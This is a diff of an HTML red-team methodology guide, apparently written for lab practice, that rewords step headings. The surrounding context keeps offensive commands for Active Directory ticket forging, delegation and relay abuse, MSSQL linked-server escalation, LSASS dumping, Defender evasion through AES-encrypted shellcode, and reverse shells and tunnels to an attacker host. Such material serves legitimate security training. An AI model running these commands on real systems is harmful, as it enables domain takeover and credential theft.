@@ -5986,7 +5986,7 @@ echo VNCFake1 | proxychains4 -q vncviewer [dc-ip] -autopass -quality 0 -nojpeg -
 
 <p><strong>MeshCentral</strong> is an open-source remote management platform that provides remote desktop control, file transfer, terminal access, and device monitoring. Its agent-based model means managed devices connect outbound to the MeshCentral server on port 443.</p>
 
-<p>Enumeration:</p>
+<p>Identify MeshCentral exposure before attempting to authenticate to the management console:</p>
 
 <pre><code class="language-bash">nmap -p443 TARGET -sC -sV</code></pre>
 
@@ -6098,7 +6098,7 @@ copy C:\Tools\sysinternals\PSExec64.exe C:\WSUS\WsusContent\02\0098C79E1404B4399
 <pre><code class="language-powershell"># On target machine, verify user was added to Administrators
 net localgroup administrators</code></pre>
 
-<p>Cleanup:</p>
+<p>Remove the malicious WSUS update after verification:</p>
 
 <pre><code class="language-powershell">.\SharpWSUS.exe delete /updateid:812772ce-0d8b-414b-823b-2cbc97d76126 /computername:srv02.[domain]</code></pre>
 
@@ -8148,7 +8148,7 @@ psexec.py -k -no-pass [domain]/administrator@[dc-hostname] -debug</code></pre>
 
 <p>Root cause / why it is abusable: Unlike constrained delegation (which requires <code>SeEnableDelegationPrivilege</code> to configure), RBCD can be configured by <strong>any account with write access to the target computer object</strong>. Common write permissions include <code>GenericWrite</code>, <code>GenericAll</code>, <code>WriteProperty</code>, or <code>WriteDACL</code>. Additionally, by default, <code>ms-DS-MachineAccountQuota</code> allows any authenticated user to create up to 10 machine accounts, providing a controlled SPN-bearing object.</p>
 
-<p>Prerequisites:</p>
+<p>RBCD abuse requires the following conditions:</p>
 <ul class="methodology-checklist">
 <li><label><input type="checkbox"> Write access (<code>GenericWrite</code>, <code>GenericAll</code>, <code>WriteProperty</code>, <code>WriteDACL</code>) to a computer's <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> attribute.</label></li>
 <li><label><input type="checkbox"> Control of another object that has an SPN (create a fake computer account or use an already-controlled one).</label></li>
@@ -8268,7 +8268,7 @@ psexec.py -k -no-pass [dc-fqdn]</code></pre>
 </ul>
 
 
-<p>Requirements:</p>
+<p>A Golden Ticket requires the following values:</p>
 <table class="custom-table">
 <thead><tr><th>#</th><th>Requirement</th><th>How to Obtain</th></tr></thead>
 <tbody>
@@ -8635,7 +8635,7 @@ psexec.py -k -no-pass [dc-fqdn]
 
 <p>Root cause: The TGS ticket is encrypted with the service account's password hash. If an attacker obtains this hash (e.g., from a compromised computer's machine account), they can forge a TGS ticket with an arbitrary PAC, granting themselves any permissions. Since the forged ticket goes directly to the service without touching the KDC, <strong>no DC logs are generated</strong>, making Silver Tickets stealthier than Golden Tickets.</p>
 
-<p>Requirements:</p>
+<p>A Silver Ticket requires the following values:</p>
 <ul class="methodology-checklist">
 <li><label><input type="checkbox"> Service/machine account's <strong>NTLM hash</strong> (or AES keys)</label></li>
 <li><label><input type="checkbox"> <strong>Domain SID</strong></label></li>
@@ -11693,7 +11693,7 @@ python3 PetitPotam.py ATTACKER_NAME@80/files TARGET_IP -u 'user$' -p 'password'<
 
 <p>Why relay enables RBCD abuse: By default, a computer can edit its own <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> attribute. If we coerce a target computer to perform NTLM authentication and relay it over LDAP to the DC, we can modify that attribute to add our attacker-controlled computer.</p>
 
-<p>Prerequisites:</p>
+<p>Kerberos RBCD relay abuse requires these conditions:</p>
 <ul class="methodology-checklist">
 <li><label><input type="checkbox"> An attacker-controlled computer account (e.g., created via relay to LDAP).</label></li>
 <li><label><input type="checkbox"> Target computer must have <strong>WebClient service enabled</strong> (so HTTP NTLM can be coerced instead of SMB, bypassing DC signing requirements).</label></li>
@@ -11733,7 +11733,7 @@ sudo ntlmrelayx.py -t ldaps://[DOMAIN]\\'SQL01$'@DC_IP --delegate-access --escal
 
 <p>Traditional privilege abuse techniques (password reset, hash theft) are disruptive. Shadow Credentials abuses the <code>msDS-KeyCredentialLink</code> attribute to add a key credential, enabling PKINIT-based authentication.</p>
 
-<p>Prerequisites:</p>
+<p>Shadow Credentials relay abuse requires these conditions:</p>
 <ul class="methodology-checklist">
 <li><label><input type="checkbox"> A relayed account with elevated privileges over the target account (e.g., cjaq has privileges over jperez).</label></li>
 <li><label><input type="checkbox"> Domain must support <strong>PKINIT</strong> (typically when AD CS or another PKI is installed).</label></li>
@@ -12778,7 +12778,7 @@ certipy auth -pfx $TARGET.pfx -domain $DOMAIN</code></pre></li>
 
 <h4 id="esc10-case1">11.12.2 Case 1; StrongCertificateBindingEnforcement = 0</h4>
 
-<p>Requirements:</p>
+<p>This ESC10 case requires the following conditions:</p>
 <ul class="methodology-checklist">
 <li><label><input type="checkbox"> <code>StrongCertificateBindingEnforcement = 0</code> (Disabled mode; no strong mapping via Kerberos).</label></li>
 <li><label><input type="checkbox"> Any template with Client Authentication (e.g., built-in <code>User</code> template).</label></li>
@@ -12789,7 +12789,7 @@ certipy auth -pfx $TARGET.pfx -domain $DOMAIN</code></pre></li>
 <p>Verify the registry key:</p>
 <pre><code class="language-bash">reg.py 'lab'/'Administrator':'[password]'@[target-ip] query -keyName 'HKLM\SYSTEM\CurrentControlSet\Services\Kdc'</code></pre>
 
-<p>Attack (Linux):</p>
+<p>From Linux, abuse the weak mapping configuration with Certipy:</p>
 <pre><code class="language-bash"># Shadow Credentials to get user2 hash
 certipy shadow auto -u '[user]@lab.local' -p '[password]' -account user2
 
@@ -12807,7 +12807,7 @@ certipy auth -pfx administrator.pfx -domain lab.local</code></pre>
 
 <h4 id="esc10-case2">11.12.3 Case 2; CertificateMappingMethods = 0x4</h4>
 
-<p>Requirements:</p>
+<p>This ESC10 mapping path requires the following conditions:</p>
 <ul class="methodology-checklist">
 <li><label><input type="checkbox"> <code>CertificateMappingMethods = 0x4</code> (SAN implicit mapping via Schannel).</label></li>
 <li><label><input type="checkbox"> GenericWrite over a user account.</label></li>
@@ -13655,7 +13655,7 @@ Add-ADGroupMember -Identity "DNSAdmins" -Members testuser -Server [domain]</code
 
 <p>Root cause: The <code>sidHistory</code> attribute is respected within a forest because SID filtering is only applied to cross-forest trusts. A Golden Ticket forged with the child domain's KRBTGT hash can include arbitrary SIDs in the PAC's ExtraSIDs array. When the parent DC processes this ticket, it grants the privileges associated with those SIDs.</p>
 
-<p>Prerequisites:</p>
+<p>The ExtraSids attack requires the following material from the child domain:</p>
 <ul class="methodology-checklist">
 <li><label><input type="checkbox"> KRBTGT hash for the child domain</label></li>
 <li><label><input type="checkbox"> SID of the child domain</label></li>
@@ -14046,7 +14046,7 @@ dir \\SQL02.[foreign-domain]\c$</code></pre>
 
 <p>When a domain user is granted remote login as <code>sa</code> (sysadmin) on a linked server, they have full control.</p>
 
-<p>Enumeration (Windows):</p>
+<p>From Windows, enumerate linked servers and confirm the remote login mapping:</p>
 <pre><code class="language-powershell">Import-Module .\PowerUpSQL.ps1
 Get-SQLServerLink
 # Check LocalLogin and RemoteLoginName attributes
@@ -14054,7 +14054,7 @@ Get-SQLServerLink
 Get-SQLQuery -Query "EXEC sp_helplinkedsrvlogin"
 # Confirms jimmy maps to sa on SQL02</code></pre>
 
-<p>Abuse (Windows via SSMS):</p>
+<p>From SSMS on Windows, use the linked server context to enable command execution:</p>
 <pre><code class="language-sql">-- Verify sysadmin rights
 SELECT * FROM OPENQUERY("SQL02\SQLEXPRESS",'SELECT IS_SRVROLEMEMBER(''sysadmin'')')
 
@@ -14064,7 +14064,7 @@ EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure;') AT "SQL02\SQLEXPRESS"
 -- Execute commands
 EXECUTE('xp_cmdshell "whoami"') AT "SQL02\SQLEXPRESS"</code></pre>
 
-<p>Enumeration and Abuse (Linux):</p>
+<p>From Linux, enumerate the link and switch into the mapped server context:</p>
 <pre><code class="language-bash"># Connect and enumerate links
 mssqlclient.py [email protected] -windows-auth
 SQL> enum_links
@@ -14080,7 +14080,7 @@ SQL> xp_cmdshell whoami</code></pre>
 
 <p>When the user only has public privileges but is the <code>db_owner</code> of a trustworthy database owned by <code>sa</code>, they can create a stored procedure that executes as the owner (sa) to grant themselves sysadmin.</p>
 
-<p>Enumeration (Windows via SSMS):</p>
+<p>From SSMS on Windows, confirm the linked-server context and trustworthy database configuration:</p>
 <pre><code class="language-sql">-- Check login name on linked server
 SELECT * FROM OPENQUERY("SQL02\SQLEXPRESS",'SELECT SUSER_NAME()')
 
@@ -14093,7 +14093,7 @@ EXEC ('sp_helpuser') AT "SQL02\SQLEXPRESS"
 -- Verify database owner is sa
 SELECT * FROM OPENQUERY("SQL02\SQLEXPRESS",'SELECT name as database_name, SUSER_NAME(owner_sid) AS owner, is_trustworthy_on AS TRUSTWORTHY from sys.databases;')</code></pre>
 
-<p>Abuse (Windows):</p>
+<p>From Windows, create and execute a stored procedure that runs as the database owner:</p>
 <pre><code class="language-sql">-- Verify RPC is enabled
 SELECT is_rpc_out_enabled FROM sys.servers WHERE name='SQL02\SQLEXPRESS'
 
@@ -14107,7 +14107,7 @@ EXEC ('sp_escalate;SELECT IS_SRVROLEMEMBER(''sysadmin'')') AT "SQL02\SQLEXPRESS"
 EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure;') AT "SQL02\SQLEXPRESS"
 EXECUTE('xp_cmdshell "whoami"') AT "SQL02\SQLEXPRESS"</code></pre>
 
-<p>Abuse (Linux):</p>
+<p>From Linux, switch to the linked server and abuse the trustworthy database path:</p>
 <pre><code class="language-bash"># Connect and switch to linked server
 mssqlclient.py [email protected] -windows-auth
 SQL> use_link "SQL02\SQLEXPRESS"
@@ -14902,7 +14902,7 @@ sliver (session) > chisel client ATTACKER:1337 R:socks</code></pre></li>
 <h4 id="kerberoasting">13.9.1 Kerberoasting</h4>
 
 
-<p>Enumeration of kerberoastable accounts:</p>
+<p>Start by identifying accounts that have SPNs and are therefore candidates for Kerberoasting:</p>
 <pre><code class="language-bash"># Via PowerView + sharpsh
 echo "Get-NetUser -spn | select samaccountname,description" | base64
 sliver (beacon) > sharpsh -- '-u http://ATTACKER:8080/PowerView.ps1 -e -c "&lt;base64&gt;"'
@@ -14914,7 +14914,7 @@ sliver (beacon) > delegationbof 6 [domain]
 sliver (beacon) > shell
 setspn.exe -Q */*</code></pre>
 
-<p>Attack execution:</p>
+<p>After selecting a target, request a service ticket and export the roastable hash in a cracking-friendly format:</p>
 <pre><code class="language-bash"># Using Rubeus via inline-execute-assembly
 sliver (beacon) > inline-execute-assembly Rubeus.exe 'kerberoast /format:hashcat /user:alice /nowrap'
 
@@ -14924,7 +14924,7 @@ sliver (beacon) > c2tc-kerberoast roast alice
 # Using bof-roast
 sliver (beacon) > bof-roast rdp/[web-fqdn]</code></pre>
 
-<p>Cracking the hash:</p>
+<p>Crack the exported Kerberoast hash offline with the appropriate Hashcat mode:</p>
 <pre><code class="language-bash">hashcat -m 13100 kerberoast_hash.txt /usr/share/wordlists/rockyou.txt</code></pre>
 
 <p>OpSec note: Only kerberoast specific target users rather than all SPN users to reduce noise.</p>
@@ -14932,7 +14932,7 @@ sliver (beacon) > bof-roast rdp/[web-fqdn]</code></pre>
 <h4 id="asreproasting">13.9.2 AS-REP Roasting</h4>
 
 
-<p>Enumeration:</p>
+<p>Enumerate accounts with Kerberos pre-authentication disabled before requesting AS-REP material:</p>
 <pre><code class="language-powershell"># Via RSAT PowerShell on target
 Install-WindowsFeature -Name RSAT-AD-PowerShell
 Get-ADUser -Filter { DoesNotRequirePreAuth -eq $true } -Properties DoesNotRequirePreAuth | select SamAccountName
@@ -14940,10 +14940,10 @@ Get-ADUser -Filter { DoesNotRequirePreAuth -eq $true } -Properties DoesNotRequir
 # Via SharpView
 sliver (beacon) > execute-assembly SharpView.exe "get-netuser -PreauthNotRequired" -t 240 -i -E -M</code></pre>
 
-<p>Attack execution:</p>
+<p>Request the AS-REP hash for the selected account and format it for offline cracking:</p>
 <pre><code class="language-bash">sliver (beacon) > inline-execute-assembly Rubeus.exe 'asreproast /format:hashcat /user:[user] /nowrap'</code></pre>
 
-<p>Cracking:</p>
+<p>Crack the AS-REP hash offline with Hashcat mode <code>18200</code>:</p>
 <pre><code class="language-bash">hashcat -m 18200 asrep_hash.txt /usr/share/wordlists/rockyou.txt</code></pre>
 
 
@@ -15076,7 +15076,7 @@ sliver (session) > psexec --custom-exe psexec-pivot.exe --service-name Teams [ta
 <h4 id="unconstrained-delegation">13.12.1 Unconstrained Delegation</h4>
 
 
-<p>Attack flow:</p>
+<p>Unconstrained delegation abuse follows this ticket flow:</p>
 <table class="custom-table">
 <thead><tr><th>Step</th><th>Description</th></tr></thead>
 <tbody>
@@ -15088,13 +15088,13 @@ sliver (session) > psexec --custom-exe psexec-pivot.exe --service-name Teams [ta
 </tbody>
 </table>
 
-<p>Enumeration:</p>
+<p>Enumerate computers configured for unconstrained delegation:</p>
 <pre><code class="language-bash"># Enumerate unconstrained delegation computers
 echo "Get-NetComputer -Unconstrained" | base64
 sliver (session) > sharpsh -- '-u http://PIVOT_IP:8080/PowerView.ps1 -e -c &lt;base64&gt;'
 # Output: dc01.[domain], [target-fqdn]</code></pre>
 
-<p>Exploitation:</p>
+<p>Exploit unconstrained delegation by coercing privileged authentication to the delegation host and reusing the captured TGT:</p>
 <pre><code class="language-bash"># On the unconstrained delegation host, monitor for TGTs
 .\Rubeus.exe monitor /interval:5 /nowrap
 
@@ -15114,11 +15114,11 @@ sliver (session) > inline-execute-assembly SpoolSample.exe 'dc01 srv01'
 
 <p>S4U2Self: The server requests a TGS for the user to access itself. <strong>S4U2Proxy:</strong> The server uses the S4U2Self ticket to request a TGS for the user to access the constrained service.</p>
 
-<p>Enumeration:</p>
+<p>Enumerate computers trusted for protocol transition and review their allowed delegation targets:</p>
 <pre><code class="language-bash">sliver (beacon) > sharpview Get-NetComputer -TrustedToAuth
 # Look for msds-allowedtodelegateto attribute</code></pre>
 
-<p>Exploitation:</p>
+<p>Exploit constrained delegation by obtaining the service account secret and performing the S4U flow:</p>
 <pre><code class="language-bash"># Step 1: Get the computer account's NTLM hash (dump LSASS)
 sliver (session) > nanodump &lt;lsass_pid&gt; web01-lsass 1 PMDM
 python3 -m pypykatz lsa minidump web01-lsass
@@ -15355,7 +15355,7 @@ sliver (beacon) > execute-assembly Rubeus.exe diamond /tgtdeleg /ticketuser:carr
 </tbody>
 </table>
 
-<p>Enumeration:</p>
+<p>Enumerate trust relationships and foreign principals before attempting cross-domain abuse:</p>
 <pre><code class="language-powershell"># Enumerate domain trusts
 *Evil-WinRM* PS> Get-DomainTrust
 # Output: [domain] <-> htb.local (Bidirectional, WITHIN_FOREST)
@@ -15703,7 +15703,7 @@ while (i &lt; buf.Length)
 
 <p>Use AES encryption with a proper key and IV to encrypt the shellcode. AES is cryptographically strong enough that Defender cannot brute-force the key to check the plaintext. At runtime, decrypt using the embedded key/IV before writing to memory.</p>
 
-<p>Workflow:</p>
+<p>The static AES workflow is:</p>
 <ul class="methodology-checklist">
 <li><label><input type="checkbox"> Generate shellcode (e.g., <code>msfvenom -p windows/x64/meterpreter/reverse_http LHOST=... LPORT=... -f csharp</code>)</label></li>
 <li><label><input type="checkbox"> AES-encrypt the raw shellcode bytes using CyberChef (with an arbitrary 16-byte key and IV)</label></li>
@@ -15853,7 +15853,7 @@ python.exe .\micr0_shell.py -i [attacker-ip] -p 8080 -l csharp
 
 # Output: byte[] buf = new byte[476] { ... };</code></pre>
 
-<p>Workflow:</p>
+<p>Use the same loader workflow with micr0_shell as the payload source:</p>
 <ul class="methodology-checklist">
 <li><label><input type="checkbox"> Generate micr0_shell shellcode for your IP/port</label></li>
 <li><label><input type="checkbox"> AES-encrypt the output using the same CyberChef recipe</label></li>
@@ -16554,7 +16554,7 @@ $bin = @(&lt;byte array of the compiled assembly&gt;);
 
 <p>The vulnerability: <code>SilentCleanup</code> executes <code>%windir%\system32\cleanmgr.exe</code>. The path uses the <strong>environment variable</strong> <code>%windir%</code>. Since HKCU environment variables are user-controllable, an attacker can redefine <code>%windir%</code> to execute arbitrary commands.</p>
 
-<p>Exploitation:</p>
+<p>Exploit the SilentCleanup path hijack by redefining <code>%windir%</code> and triggering the scheduled task:</p>
 <pre><code class="language-powershell"># Step 1: Set %windir% to execute our payload
 # The space at the end is critical -- it separates our command from the appended path
 Set-ItemProperty -Path "HKCU:\Environment" -Name "windir" -Value "cmd.exe /K C:\Windows\Tasks\RShell.exe [attacker-ip] 8080 & REM " -Force
@@ -18244,7 +18244,7 @@ python3 sccmhunter.py http -u USER -p PASS -dc-ip DC_IP -auto</code></pre>
 
 <p>The Heartbeat Discovery mechanism sends DDR requests to update client information. These DDR requests can be faked to indicate a machine lacks the SCCM client, causing the Primary Server to attempt Client Push installation, authenticating with each client push account sequentially (these often have local admin or Domain Admin privileges).</p>
 
-<p>Prerequisites:</p>
+<p>Client Push exploitation depends on the following conditions:</p>
 <ul class="methodology-checklist">
   <li><label><input type="checkbox"> Hotfix KB15599094 disabling NTLM authentication must not be applied</label></li>
   <li><label><input type="checkbox"> NTLM must not be manually disabled</label></li>
